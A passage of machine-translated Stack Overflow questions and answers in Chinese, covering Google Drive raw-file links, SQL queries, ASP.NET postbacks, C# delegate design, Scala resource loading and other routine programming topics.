> 赞同：25
> 
> 时间：2014-10-04T09:31:36.250

谷歌似乎已经改变了它。

在撰写本文时，原始数据的链接使用以下链接格式：

`https://drive.google.com/uc?id=YOUR_DOCUMENT_ID`

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2013-02-27T12:53:53.093

**更新：截至 2015 年 8 月 31 日，此技术已被[Google 弃用](https://support.google.com/drive/answer/2881970?hl=en)。**

Google 最近使在 Google Drive 上公开托管文件成为可能：

1.  在 Google 云端硬盘中创建文件夹
2.  将您想要公开访问的任何文件放在文件夹中
3.  公开共享（需要“在网络上公开”）并从“共享链接”中复制文件夹 ID。例如，此链接中的文件夹 ID：[https](https://docs.google.com/folder/d/0B5AR8ct5SZfSTDZTQjNNVXR4RWM/edit) ://docs.google.com/folder/d/0B5AR8ct5SZfSTDZTQjNNVXR4RWM/edit ... 是：**0B5AR8ct5SZfSTDZTQjNNVXR4RWM**
4.  每个文件的 URL 将是**[https://googledrive.com/host/](https://googledrive.com/host/)**，后跟文件夹 ID，后跟文件名。例如：如果您在步骤 1 中将**style.css保存在文件夹中：** [https ://googledrive.com/host/0B5AR8ct5SZfSTDZTQjNNVXR4RWM/style.css](https://googledrive.com/host/0B5AR8ct5SZfSTDZTQjNNVXR4RWM/style.css)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-02-12T14:38:22.423

Google 在 HTML 服务最佳实践中关于[分离 HTML、CSS 和 Javascript](http://developers.google.com/apps-script/guides/html/best-practices#separate_html_css_and_javascript)的建议怎么样？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-03-04T00:54:49.460

它仍然有效，只是 URL 看起来有点不同。[已经在这里](https://stackoverflow.com/questions/24834877/google-drive-raw-data/35786049#35786049)回答了，但步骤是：

1.  在包含您想要的文件（例如 FILE.css）的文件夹上，点击共享设置，然后点击高级，然后选择“在网络上公开 - 互联网上的任何人都可以找到和查看”。
2.  在 URL 栏（或共享链接）中，复制 drive.google.com/drive/u/0/folders/ 之后的所有内容
3.  使用该 ID 替换 XX-XXXXXXXXXXXXX 在：http: [//googledrive.com/host/XX-XXXXXXXXXXXXX/FILE.css](http://googledrive.com/host/XX-XXXXXXXXXXXXX/FILE.css)
4.  导航到第 3 步中附加的 URL，您现在将看到您的原始数据。

感谢@chris.huh：[https ://productforums.google.com/forum/#!topic/drive/MyD7dgLJaEo](https://productforums.google.com/forum/#!topic/drive/MyD7dgLJaEo)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2020-05-25T15:34:43.013

我发现直接链接解决方法发生了一些变化。您现在可以使用以下网址下载任何文件：

[https://drive.google.com/uc?export=download&id=[PutYourIdHere]](https://drive.google.com/uc?export=download&id=[PutYourIdHere])

这是您提取文件 id 的方式：

[https://drive.google.com/file/d/1gIax1-2397HJFLSJFOIUWEIJ23/view?usp=sharing](https://drive.google.com/file/d/1gIax1-2397HJFLSJFOIUWEIJ23/view?usp=sharing)

这`1gIax1-2397HJFLSJFOIUWEIJ23`是身份证

# mysql - Mysql 将所有表列从 n/a 更新为 NULL

> ID：15110265
> 
> 赞同：0
> 
> 时间：2013-02-27T10:55:02.280
> 
> 标签：mysql, sql, loops

我的数据库中有一个表，有些字段是 n/a 不是 NULL，因为我从文本文件中导入了它们。我想要一个查询，如果该列的值为 n/a，则循环我的表的每一列，将其更新为 NULL .任何解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T11:03:35.150

在导入之前，使用文本编辑器的查找和替换功能将所有 N/A 值替换为 Null。不确定您必须使用什么来表示文本文件中的 Null，但应该有一些 MySQL 可以理解的内容。

# wordnet - senseval 2 数据集格式

> ID：15110269
> 
> 赞同：1
> 
> 时间：2013-02-27T10:55:11.563
> 
> 标签：wordnet

我希望使用 Senseval-2 Coarse Sense Dataset，但有相同的描述（关于数据集的格式）。

它应该有决策数据，即是否应该合并两种感官。中间值是置信度吗？此外，他们使用了 Wordnet 1.7 的预发布版本。我可以用 Wordnet 1.7 做同样的事情吗？

文件中的示例如下所示：

材料%5:00:00:物理:00 3 材料%5:00:00:世俗:00

材料%3:00:03::3 材料%5:00:00:世俗:00

材料%3:00:04:: 2 材料%3:00:01::

材料%3:00:02::

发布%5:00:00: 成功(a):00

现在%3:00:01::

现在%3:00:02::

现在%3:01:00::

石头%3:01:00::

石头％5：00：00：彩色：00

空气%1:15:00:: 4 空气%1:27:00::

空气%1:19:00:: 4 空气%1:27:00::

空气%1:27:01:: 4 空气%1:27:00::

空气%1:04:00::

空气%1:10:02::

空气%1:07:00::

空气%1:10:01::

上诉%1:04:00:: 3 上诉%1:10:00::

上诉%1:10:02:: 3 上诉%1:10:00::

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-06T04:05:43.550

通过检查，中间的数字实际上描述了有多少个感官在同一个合并的意义上。例如：

```
matrial%5:00:00:physical:00 3 material%5:00:00:worldly:00
material%3:00:03:: 3 material%5:00:00:worldly:00 
```

基本上说有 3 种感觉被认为与 相同`material%5:00:00:worldly:00`，它们是两条线中提供的两种感觉，以及感觉本身。

您还可以看到，没有合并的感觉没有数字，例如`air%1:04:00`，并且`material%3:00:04:: 2 material$2:00:01::`您可以看到有两种感觉。因此，您可以通过将第一个位置的感官映射到第二个位置的感官来进行合并。

# asp.net - 在 asp.net 中的 div 上单击事件

> ID：15110274
> 
> 赞同：1
> 
> 时间：2013-02-27T10:55:21.983
> 
> 标签：asp.net, .net

我在 default.aspx 中有一个 div，里面有 img 如下

```
 <div id="sTab" class="tabs firsttab" runat="server">
     <asp:Image ID="sTabImg"  src="images/home.png" runat="server" />
 Activities
</div> 
```

我想在 ASP.NET（不是在 javascript 中）中单击 div 时执行一些操作。

我尝试了以下

```
protected void Page_Load(object sender, EventArgs e)
{
    if (!IsPostBack)
    {
    }

    sTabImg.Attributes["onclick"] = ClientScript.GetPostBackEventReference(this, "ClickDiv");
}

protected void ClickDiv()
{
    Label2.Text = "helo got it";
} 
```

页面正在刷新，当我调试问题时，它没有进入 ClickDiv 功能..这里有什么问题..

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:05:20.720

从[这里](http://forums.asp.net/t/1090438.aspx/1)

```
public partial class _Default : System.Web.UI.Page, IPostBackEventHandler
{

    protected void Page_Load(object sender, EventArgs e)
    {
       div1.Attributes["onclick"]=ClientScript.GetPostBackEventReference(this,"ClickDiv");
    }

    protected void Div1_Click()
    {
      // Do something
    }

    #region IPostBackEventHandler Members

    public void RaisePostBackEvent(string eventArgument)
    {

      if (!string.IsNullOrEmpty(eventArgument))
      {

              if (eventArgument == "ClickDiv")
              {
                 Div1_Click();
              }
      }
    }

    #endregion
} 
```

您必须实现**IPostBackEventHandler**接口。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:00:36.727

为什么不使用[ImageButton](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.imagebutton.aspx)？

```
<%@ Page Language="C#" AutoEventWireup="True" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
    <title>ImageButton Sample</title>
<script language="C#" runat="server">

      void ImageButton_Click(object sender, ImageClickEventArgs e) 
      {
         Label1.Text = "You clicked the ImageButton control at the coordinates: (" + 
                       e.X.ToString() + ", " + e.Y.ToString() + ")";
      }

</script>

</head>
<body>
<form id="form1" runat="server">

  <h3>ImageButton Sample</h3>

  Click anywhere on the image.<br /><br />

  <asp:ImageButton id="imagebutton1" runat="server"
       AlternateText="ImageButton 1"
       ImageAlign="left"
       ImageUrl="images/pict.jpg"
       OnClick="ImageButton_Click"/>

      <br /><br />

      <asp:label id="Label1" runat="server"/>

   </form>

</body>
</html> 
```

你可以[在这里](http://www.devmanuals.com/tutorials/ms/aspdotnet/imagebutton.html)看到一些例子。

# zend-framework2 - 有没有提供文件系统抽象层的 Zend2 库？

> ID：15110283
> 
> 赞同：1
> 
> 时间：2013-02-27T10:55:51.753
> 
> 标签：zend-framework2

我正在寻找类似的东西：http: [//knplabs.com/blog/give-your-projects-a-gaufrette](http://knplabs.com/blog/give-your-projects-a-gaufrette) 谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:15:00.820

只需使用[Gaufrette](https://github.com/KnpLabs/Gaufrette)，我也这样做（即使在 ZF2 项目中）！

```
php composer.phar require knplabs/gaufrette:0.1.* 
```

然后，您可以在应用程序的任何地方使用它，并最终通过在您的`YourNamespace\Module#getServiceConfig`:

```
namespace YourNamespace;

use Zend\ModuleManager\Feature\ServiceProviderInterface;
use Zend\ModuleManager\Feature\ConfigProviderInterface;
use Zend\ServiceManager\ServiceLocatorInterface;
use Gaufrette\Filesystem;
use Gaufrette\Adapter\Local as LocalFs;

class Module implements ServiceProviderInterface, ConfigProviderInterface
{
    public function getConfig()
    {
        return array(
            'your_namespace' => array(
                'filesystem' => array(
                    'base_path' => 'data/files',
                ),
            ),
        );
    }

    public function getServiceConfig()
    {
        return array(
            'factories' => array(
                'YourNamespace\Filesystem' => function (ServiceLocatorInterface $sl) {
                    $config   = $sl->get('Config');
                    $basePath = $config['your_namespace']['filesystem']['base_path'];

                    return new Filesystem(new LocalFs($basePath, true));
                },
            ),
        );
    }
} 
```

然后，您可以`YourNamespace\Filesystem`在所有应用程序中使用服务。

我还将它与`Symfony\Filesystem`处理文件移动/复制/检查操作结合使用。并非所有内容都必须来自 Zend Framework 2 才能在 ZF2 应用程序中使用。

# c# - 使用异常通知未设置委托 - 糟糕的设计？

> ID：15110289
> 
> 赞同：2
> 
> 时间：2013-02-27T10:56:04.670
> 
> 标签：c#, exception, delegates, class-design

我制作了一个文档类，可以下载并阅读其中的文本。聪明的是，它仅在需要时或在需要时才下载和读取文档中的文本。通过使用 Text 属性，它将尝试读取文档，如果尚未下载，它将下载它然后读取它。

这是很不错的。但是我注意到我对异常的使用会导致一些时髦的代码。见下文。

**文档类**

```
public delegate byte[] DownloadBinaryDelegate(IDocument document);
public delegate string TextReaderDelegate(IDocument document);

public class Document
{
        public DownloadBinaryDelegate DownloadBinaryDelegate { private get; set; }
        public TextReaderDelegate TextReaderDelegate { private get; set; }

        private bool _binaryIsSet;
        private byte[] _binary;
        public byte[] Binary
        {
            get 
            {
                if (_binaryIsSet)
                    return _binary;

                if (DownloadBinaryDelegate == null)
                    throw new NullReferenceException("No delegate attached to DownloadBinaryDelegate.");

                Binary = DownloadBinaryDelegate(this);
                DownloadBinaryDelegate = null; // unhock delegate as it's no longer needed.

                return _binary;
            }
            set
            {
                if (_binaryIsSet) 
                    return;

                _binary = value;
                _binaryIsSet = true;
            }
        }

        private bool _textIsSet;
        private string _text;
        public string Text
        {
            get
            {
                if (_textIsSet)
                    return _text;

                if (TextReaderDelegate == null)
                    throw new NullReferenceException("No delegate attached to TextReaderDelegate.");

                Text = TextReaderDelegate(this); // this delegate will call Binary and return the translated text.
                TextReaderDelegate = null; // unhock delegate as it's no longer needed.

                return _text;
            }
            set
            {
                if (_textIsSet)
                    return;

                _text = value;
                _textIsSet = true;
            }
        } 
```

**问题**

我一开始写的。

```
if (document.Text == null) // text is not set
{
    if (document.Binary == null) // binary has not been downloaded
        document.DownloadBinaryDelegate = Util.DownloadDocument;

    document.TextReaderDelegate = Util.ReadDocument;
} 
```

完全忘记了 Text 属性会引发异常。所以我必须写这样的东西，这是一个有点时髦的代码。

```
// check if text has already been read and set
try
{
    var isTextSet = document.Text == null;
}
catch (NullReferenceException)
{
    document.DownloadBinaryDelegate = Util.DownloadDocument;
    document.TextReaderDelegate = Util.ReadDocument;
} 
```

我希望你能明白我的意思。

所以我的问题是，这是一个糟糕的设计吗？你会怎么做？请记住，我仍然想要当前的功能。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T11:01:13.837

延迟初始化已经融入 .NET 框架。我建议使用[`Lazy<T>`](http://msdn.microsoft.com/en-us/library/dd642331.aspx).

要回答您的具体问题，听起来您的类将始终需要 Binary 和 Text 委托，因此我会将它们设为构造函数的必需参数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T18:59:25.113

我无法使用 Lazy，因为我正在使用不允许的 delegate(this)。

所以我最终使用了这里的好答案：[当属性不能为空时使用什么异常类型？](https://stackoverflow.com/questions/1488322/what-exception-type-to-use-when-a-property-cannot-be-null)

```
public class Document
{
    private DownloadBinaryDelegate _downloadBinaryDelegate;
    public void SetDownloadBinaryDelegate(DownloadBinaryDelegate downloadBinary)
    {
        if (downloadBinary == null)
            throw new ArgumentNullException("downloadBinary");

        _downloadBinaryDelegate = downloadBinary;
    }

    private TextReaderDelegate _textReaderDelegate;
    public void SetTextReaderDelegate(TextReaderDelegate readerDelegate)
    {
        if (readerDelegate == null)
            throw new ArgumentNullException("readerDelegate");

        _textReaderDelegate = readerDelegate;
    }

    private bool _binaryIsSet;
    private byte[] _bytes;

    public void SetBinary(byte[] bytes, bool forceOverwrite = false)
    {
        if (_binaryIsSet && !forceOverwrite)
            return;

        _bytes = bytes;
        _binaryIsSet = true;
    }

    public byte[] GetBinary()
    {
        if (_binaryIsSet)
            return _bytes;

        if (_downloadBinaryDelegate == null)
            throw new InvalidOperationException("No delegate attached to DownloadBinaryDelegate. Use SetDownloadBinaryDelegate.");

        SetBinary(_downloadBinaryDelegate(this));
        _downloadBinaryDelegate = null; // unhock delegate as it's no longer needed.

        return _bytes;
    }

    public bool TryGetBinary(out byte[] bytes)
    {
        if (_binaryIsSet)
        {
            bytes = _bytes;
            return true;
        }

        if (_downloadBinaryDelegate != null)
        {
            bytes = GetBinary(); // is this legit?
            return true;
        }

        bytes = null;
        return false;
    }

    private bool _textIsSet;
    private string _text;

    public void SetText(string text, bool forceOverwrite = false)
    {
        if (_textIsSet && !forceOverwrite)
            return;

        _text = text;
        _textIsSet = true;
    }

    public string GetText()
    {
        if (_textIsSet)
            return _text;

        if (_textReaderDelegate == null)
            throw new InvalidOperationException("No delegate attached to TextReaderDelegate. Use SetTextReaderDelegate.");

        SetText(_textReaderDelegate(this)); // this delegate will call Binary and return the read text.
        _textReaderDelegate = null; // unhock delegate as it's no longer needed.

        return _text;
    }

    public bool TryGetText(out string text)
    {
        byte[] bytes;
        if (!TryGetBinary(out bytes))
        {
            text = null;
            return false;
        }

        if (_textIsSet)
        {
            text = _text;
            return true;
        }

        if (_textReaderDelegate != null)
        {
            text = GetText(); // is this legit?
            return true;
        }

        text = null;
        return false;
    }
} 
```

# mysql - MySQL 从 TIMESTAMP 中选择正好 7 天前的行

> ID：15110293
> 
> 赞同：1
> 
> 时间：2013-02-27T10:56:16.997
> 
> 标签：mysql, date, timestamp

首先，我知道我的问题与那个问题非常相似：

[MySQL 从 7 天前选择行](https://stackoverflow.com/questions/7756708/mysql-select-rows-from-exactly-7-days-ago)

不同之处在于我的日期作为时间戳存储在数据库中。

我知道我可以使用 FROM_UNIXTIME 从时间戳中获取日期，事实是，在我读到的另一个答案中，这非常消耗资源（因为在比较之前必须将时间戳字段转换为所有记录中的日期）。

DATE(from_unixtime(timestamp)) = CURRENT_DATE()

有没有优化的方法来做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T10:59:21.033

扭转它：首先计算目标日期的unix时间戳并使用它。

```
WHERE timestamp = UNIX_TIMESTAMP(NOW() - INTERVAL 7 DAY) 
```

MySQL 应该计算一次该值并一直使用它（尽管需要测试）。如果没有，请使用变量或代码。

# json - 没有设置方法的 GWT Autobean

> ID：15110296
> 
> 赞同：1
> 
> 时间：2013-02-27T10:56:27.197
> 
> 标签：json, gwt, autobean

我正在使用 Autobean 框架在我的 GWT 应用程序中编码/解码 JSON。它适用于具有 getter 和 setter 的接口的情况。`setThisCollectionProperty`但是有没有办法在不指定 a而不是使用方法的情况下以其他方式做到这一点`addToThisCollectionProperty`？

例如，我有一个`IPerson`这样的界面：

```
public interface IPerson {
       public String getName();
       public void setName(String name);

       public int getAge();
       public void setAge(int age);

       public List<String> getIds();
       public void addId(String id);
} 
```

BeanFactory 是这样的：

```
public interface BeanFactory extends AutoBeanFactory {

    public AutoBean<IPerson> person();

    public AutoBean<IPerson> person(IPerson person);

} 
```

在实现 IPerson 的 Person 类中，

```
public class Person implements IPerson {
       private String name;
       private List<String> ids;
       ...

       public List<String> getIds() {
              return ids;
       }

       public void addId(String id) {
              ...
              ids.add(id);
       }
} 
```

如果`addId(String id)`替换为`setIds(List<String> ids)`. 否则会显示以下错误：

> com.mycompany.jsonsample.beans.IPerson 参数化并不简单，但是 person 方法没有提供委托

是否可以在没有方法的情况下进行编码/解码`set`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T13:51:25.133

AutoBean 管理所有的 getter 和 setter，并且只管理 getter 和 setter。对于任何其他方法，您必须使用[*category*](https://code.google.com/p/google-web-toolkit/wiki/AutoBean#Categories)。

使用类别，您可以因此实现`addId(…)`as ，或者如果[是 wrapper](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/web/bindery/autobean/shared/AutoBean.html#isWrapper%28%29)`getIds().add(…)`则可能直接调用`addIds`底层[对象](http://google-web-toolkit.googlecode.com/svn/javadoc/latest/com/google/web/bindery/autobean/shared/AutoBean.html#unwrap%28%29)。`AutoBean`

# java - 扩展具有最终属性的类。小样

> ID：15110297
> 
> 赞同：1
> 
> 时间：2013-02-27T10:56:29.657
> 
> 标签：java, unit-testing, mocking, final

我通常将类的每个属性设置为 final（仅适用于将在构造函数中初始化的属性）。关键是我现在正在实现一个用于测试目的的对象模型。这个 Mockup 扩展了它正在模拟的类，并且这个类具有一些最终属性。因此，我不得不在 Mockup 对象的构造函数中调用 super() 构造函数。然而，这破坏了 Mockup 的实用性，因为我不希望它以普通类的方式初始化所有属性。我宁愿调用 Mockup 构造函数而不调用 super() 并做任何我想做的事情。

我的问题是：将属性定义为 final 是否是一种好习惯，只要它们会强制您在 Mockup 中调用类构造函数吗？

编辑：我添加了一些代码。这种情况下的问题是我使用的是单例，我知道在测试时这不是一个好主意，但在这种情况下我无法更改它。所以我的意图不是在 Mockup 中调用这个方法。

```
public class ReportsDataManager {

private final Map<String, List<String>> translations;

public ReportsDataManager() {
this.translations = GenericUtils.getTranslation();
} 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T10:59:19.330

当您可以做到时，将属性声明为 final 是一个非常好的做法。它赋予不变性 - 保证线程安全。打破它来嘲笑是一个坏主意。你的设计应该服务于用户的需求，而不是你的测试方便。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:00:35.037

如果您想模拟该类，请给它一个接口并模拟该接口。此外，[模拟不是 stubs](http://martinfowler.com/articles/mocksArentStubs.html)。听起来你正在创建一个存根，而不是一个模拟。如果您确实希望创建一个模拟，请选择一个为您生成接口模拟的库。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-27T10:59:19.367

一般来说，我会说，如果您使用的做法使测试代码更加困难，那么这种做法可能是一种气味。

尝试通过设置变量来**准确**确定您想要实现的目标`final`。会`protected`被接受吗？

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-02-27T11:10:01.963

`final`您可以使用标准反射回避限制。由于您处于模型的上下文中，因此我想这不会造成太大问题。请注意多线程问题：JVM 将假定该字段符合`final`语义，并会在此基础上进行优化。

# c# - C# 方法参数语法 - 这是什么意思？

> ID：15110308
> 
> 赞同：6
> 
> 时间：2013-02-27T10:56:52.497
> 
> 标签：c#, syntax, parameters

一旦我知道这意味着什么，可能有更好的方式来表达这个问题，但我不知道从哪里开始。

这是 StreamReader 的 Read 方法：

```
public override int Read([In, Out] char[] buffer, int index, int count) { ... } 
```

那个“进出”位——它是做什么用的，它有什么作用，它叫什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-27T11:01:40.593

> 那个“进出”位——它是做什么用的，它有什么作用，它叫什么？

它们是*[参数属性](http://msdn.microsoft.com/en-us/library/z0w1kczw.aspx)*。

在这种情况下[`System.Runtime.InteropServices.InAttribute`](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.inattribute.aspx)，[`System.Runtime.InteropServices.OutAttribute`](http://msdn.microsoft.com/en-us/library/system.runtime.interopservices.outattribute.aspx)它们用于与 .NET 运行时之外的代码进行互操作。

# python - 如何改变矩阵元素的浮点精度（不是查看时）

> ID：15110309
> 
> 赞同：0
> 
> 时间：2013-02-27T10:56:52.863
> 
> 标签：python, scipy

我有一个这种形状的矩阵：

```
>>> A = [ [12.11432, 10.00211, 9.44100],[0.12361, 5511.13478, 189.79823] ] 
```

A 是稀疏矩阵，我使用的正是`lil_matrix`. 我想将 A 的每个元素除以所有元素的总和。此除法的结果必须是与 A 具有相同精度的矩阵 B。

```
>>> from scipy.sparse import lil_matrix
>>> import numpy as np
>>> A = np.array([ [12.11432, 10.00211, 9.44100],[0.12361, 5511.13478, 189.79823] ])
>>> A = lil_matrix(A)
>>> B = A / A.sum()
>>> B.toarray()
array([[  2.11322791e-03,   1.74477296e-03,   1.64689266e-03],
        [  2.15625889e-05,   9.61365048e-01,   3.31084961e-02]]) 
```

如您所见，A 和 B 之间的精度不一样。
那么，**如何在 B 矩阵中只保留小数点后的 5 位？**

# c++ - 如何在 C++ 中为给定的十六进制数据计算二进制 SHA256 哈希？

> ID：15110311
> 
> 赞同：0
> 
> 时间：2013-02-27T10:57:03.607
> 
> 标签：c++

我想使用 Crypto++ 为给定的“十六进制数据”（二进制）生成 SHA256 签名。有人可以分享代码吗？我发现了一个类似的问题“谁能给我一个使用 Crypto++ 在 C++ 中生成 SHA256 哈希的工作示例，...”，但它使用“字符串”作为输入和返回字符串。我还想知道“123”的字符串哈希是否可以转换为“123”的二进制哈希（我的意思是任何输入。“123”只是一个例子”）？（我使用[http://www.fileformat .info/tool/hash.htm](http://www.fileformat.info/tool/hash.htm) to check that the string hash of 123 is a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3 AND the binary hash of 123 is 3d73c0c831c942c1996ca667b639970e571d58c6b7b996e4082a6d091be0b956)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T11:24:10.040

Crypto++ 哈希函数适用于字节数组。这就是你可以散列字符串的原因——因为它是字节数组。因此，您可以处理字节数组，然后应用相同的算法将结果转换为字符串。

“字符串”哈希不能转换为“二进制”哈希，因为实际上它都是具有不同二进制数据的二进制哈希。

# sql - 使用 SQL 查询计算单词出现次数

> ID：15110313
> 
> 赞同：3
> 
> 时间：2013-02-27T10:57:13.497
> 
> 标签：sql, oracle

我有两张桌子。

表格1：

```
ID   SENTENCE
1    The shoes are good shoes.
2    There is a tree.
3    This is nice, nice, nice! 
```

表2：

```
ID   WORD
1    The
1    shoes
1    are
1    good
1    shoes
2    There
2    is
2    a
2    tree
3    This
3    is
3    nice
3    nice
3    nice 
```

我需要计算 Table1 中每个句子中每个单词的出现次数。如果任何单词出现多次（>1），则计算它，否则跳过它。最后生成的表应如下所示：

```
ID   SENTENCE                   CNT
1    The shoes are good shoes.  2
2    There is a tree.
3    This is nice, nice, nice!  3 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:09:48.847

您可以使用`count() over()`：

```
select distinct t1.id,
  t1.sentence,
  coalesce(t2.cnt, 0) cnt
from table1 t1
left join 
(
  select t1.id, 
    t1.sentence,
    t2.word,
    count(t2.word) over(partition by t1.id, t2.word) cnt
  from table1 t1
  left join table2 t2
    on t1.id = t2.id
) t2
  on t1.id = t2.id
  and t2.cnt > 1
order by t1.id 
```

请参阅[SQL Fiddle with Demo](http://www.sqlfiddle.com/#!4/9a949/16)。

或者您可以使用`count()`：

```
select t1.id,
  t1.sentence,
  coalesce(t2.cnt, 0) cnt
from table1 t1
left join 
(
  select t1.id, 
    t1.sentence,
    t2.word,
    count(t2.word) cnt
  from table1 t1
  left join table2 t2
    on t1.id = t2.id
  group by t1.id, t1.sentence, t2.word
  having count(t2.word) > 1
) t2
  on t1.id = t2.id
order by t1.id 
```

请参阅[带有演示的 SQL Fiddle](http://www.sqlfiddle.com/#!4/9a949/22)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-27T11:19:30.807

[SQL 演示](http://sqlfiddle.com/#!4/e86ab/9)

```
select t1.id, t1.sentence, 
coalesce(t2.cnt,0) as counts
from table1 t1
left join
(select id, word, count(id) cnt
from table2
group by id, word
having count(id) > 1)t2
on t1.id = t2.id
order by t1.id
;

| ID |                  SENTENCE | COUNTS |
-------------------------------------------
|  1 | The shoes are good shoes. |      2 |
|  2 |          There is a tree. |      0 |
|  3 | This is nice, nice, nice! |      3 | 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:02:32.500

```
SELECT table1.id, table1.sentence, COUNT(word) as cnt FROM table2 JOIN table1 ON table1.id = table2.id GROUP BY table2.word HAVING COUNT(word) > 1 
```

我的答案是 mysql，我现在正在验证它是否也适用于 sql

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-27T14:26:44.873

有很多连接示例，因此，我将仅添加字数示例：

```
Select REGEXP_COUNT('The shoes are good shoes.', ' ')+1 words_count
 From dual
/

WORDS_COUNT
-----------
5

SELECT id
     , LISTAGG(word, ' ') WITHIN GROUP (ORDER BY id, word) AS words
     , count(*) word_cnt
  FROM your_table2
GROUP BY id
/

ID    WORDS                    WORD_CNT
---------------------------------------
1    The are good shoes shoes    5
2    There a is tree             4
3    This is nice nice nice      5 
```

# scala - 使用scala读取类路径下的属性文件

> ID：15110315
> 
> 赞同：7
> 
> 时间：2013-02-27T10:57:29.130
> 
> 标签：scala, classpath

我正在尝试使用 scala 从类路径中读取属性文件。但它看起来不起作用，它与java不同。以下2个代码片段，一个是java（工作），另一个是scala（不工作）。我不明白有什么区别。

```
// working
BufferedReader reader = new BufferedReader(new InputStreamReader(
Test.class.getResourceAsStream("conf/fp.properties")));

// not working 
val reader = new BufferedReader(new InputStreamReader(
getClass.getResourceAsStream("conf/fp.properties")));

Exception in thread "main" java.lang.NullPointerException
at java.io.Reader.<init>(Reader.java:78)
at java.io.InputStreamReader.<init>(InputStreamReader.java:72)
at com.ebay.searchscience.searchmetrics.fp.conf.FPConf$.main(FPConf.scala:31)
at com.ebay.searchscience.searchmetrics.fp.conf.FPConf.main(FPConf.scala) 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2014-12-24T12:39:58.377

这段代码终于为我工作了：

```
import java.util.Properties
import scala.io.Source

// ... somewhere inside module.

var properties : Properties = null

val url = getClass.getResource("/my.properties")
if (url != null) {
    val source = Source.fromURL(url)

    properties = new Properties()
    properties.load(source.bufferedReader())
} 
```

现在你有了普通的 java.util.Properties 来处理我的遗留代码实际需要接收的内容。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2013-02-27T12:05:07.167

我猜你`BufferedReader`是一个`java.io.BufferedReader`

在这种情况下，您可以简单地执行以下操作：

```
import scala.io.Source.fromUrl
val reader = fromURL(getClass.getResource("conf/fp.properties")).bufferedReader() 
```

但是，这留下了关于您打算如何处理`reader`之后的问题。`scala.io.Source`已经有一些有用的方法可能会让你的很多代码变得多余..[参见 ScalaDoc](http://www.scala-lang.org/api/current/index.html#scala.io.Source)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-06-22T14:05:01.337

我首选的解决方案是使用[com.typesafe.scala-logging](http://mvnrepository.com/artifact/com.typesafe.scala-logging/scala-logging-slf4j_2.11)。我确实在 main\resources 文件夹中放置了一个 application.conf 文件，内容如下：

`services { mongo-db { retrieve = """http://xxxxxxxxxxxx""", base = """http://xxxxxx""" } }`

并且要在类中使用它，首先从 typesafe 加载配置工厂，然后使用它。

`val conf = com.typesafe.config.ConfigFactory.load() conf.getString("services.mongo-db.base"))`

希望能帮助到你！

附言。我敢打赌，每个以 .conf 作为扩展名的资源文件都会被读取。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-02-27T13:34:37.797

对于阅读我建议使用的属性文件`java.util.ResourceBundle.getBundle("conf/fp")`，它使生活变得更轻松。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-06-03T09:57:15.167

您看到的 NullPointerException 是由底层 Java 代码中的错误引起的。这*可能*是由输入错误的文件名引起的。

有时，如果您尝试使用错误的类加载器加载资源，也会出现此错误。

1.  根据您的类路径仔细检查资源 url。
2.  尝试`Source.fromInputStream(getClass.getResourceAsStream(...))`
3.  尝试`Source.fromInputStream(getClass.getClassLoader.getResourceAsStream())`
4.  也许您正在使用其他可以尝试的类加载器？

同样的故事也发生在`Source.fromUrl(...)`

如果您尝试加载配置文件并控制它们的格式，则应该查看 Typesafe 的[Config](https://github.com/typesafehub/config)实用程序。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2014-08-30T01:21:13.007

您得到的空指针异常来自 getResourceAsStream 返回空值。以下 junit.scala 片段显示了类与类加载器的区别。请参阅[Class.getResource() 和 ClassLoader.getResource() 有什么区别？](https://stackoverflow.com/q/6608795/154461). 这里我假设`fileName`是驻留在类路径中的文件的名称，而不是运行测试的类旁边的文件。

```
assertTrue(getClass.getClassLoader().getResourceAsStream(fileName) != null)
assertTrue(getClass.getClassLoader().getResourceAsStream("/" + fileName) == null)
assertTrue(getClass.getResourceAsStream(fileName) == null)
assertTrue(getClass.getResourceAsStream("/" + fileName) != null) 
```

# hibernate - 休眠中的 saveorupdate 无法在休眠中使用 @generated 值

> ID：15110316
> 
> 赞同：0
> 
> 时间：2013-02-27T10:57:29.350
> 
> 标签：hibernate, annotations

我在休眠中的 saveOrUpdate() 函数有问题。我正在使用 Oracle 数据库。我需要使用自动生成的主键插入一行。我在hibernate注释中配置了这个id，如下所示，

**模型.java**

```
